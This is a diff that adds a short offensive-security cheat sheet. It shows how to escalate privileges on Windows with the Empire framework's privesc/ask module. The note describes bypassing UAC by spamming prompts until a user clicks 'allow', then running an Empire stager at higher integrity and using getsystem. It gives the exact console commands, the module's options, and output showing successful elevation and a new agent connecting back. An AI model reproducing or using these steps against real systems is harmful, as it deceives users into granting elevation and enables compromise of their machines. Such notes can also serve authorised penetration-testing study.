@@ -1,0 +1,36 @@
+Empire - Priviledge escalation using privesc/ask
+
++ Bypass UAC by spamming UAC prompts until user clicks "allow"
+
++ Will run Empire stager in a higher integrity process and follow up by "getsystem" module to elevate to system account
+
++ DEFINITELY NOT OPSEC SAFE, last option if you're desperate
+	# (Empire: DL3NCB5V) > usemodule privesc/ask
+	# (Empire: powershell/privesc/getsystem) > info
+
++ Check the option using info command and make sure Listener and Agent is configured correctly and execute
+	# (Empire) > interact DL3NCB5V
+	# (Empire: DL3NCB5V) > usemodule privesc/ask
+	# (Empire: powershell/privesc/ask) > info
+	
+	Options:
+	
+	  Name       Required    Value                     Description
+	  ----       --------    -------                   -----------
+	  Listener   True                                  Listener to use.                        
+	  UserAgent  False       default                   User-agent string to use for the staging
+													   request (default, none, or other).      
+	  Proxy      False       default                   Proxy to use for request (default, none,
+													   or other).                              
+	  Agent      True        DL3NCB5V                  Agent to run module on.                 
+	  ProxyCreds False       default                   Proxy credentials                       
+													   ([domain\]username:password) to use for 
+													   request (default, none, or other). 
+
+	# (Empire: powershell/privesc/ask) > set Listener TargeMe_Listener
+	# (Empire: powershell/privesc/ask) > execute
+	# [>] Module is not opsec safe, run? [y/N] y
+	# (Empire: powershell/privesc/ask) > 
+	# Job started: P1YSLE
+	# [*] Successfully elevated!
+	# [+] Initial agent APC3E2RB from 192.168.202.149 now active (Slack)
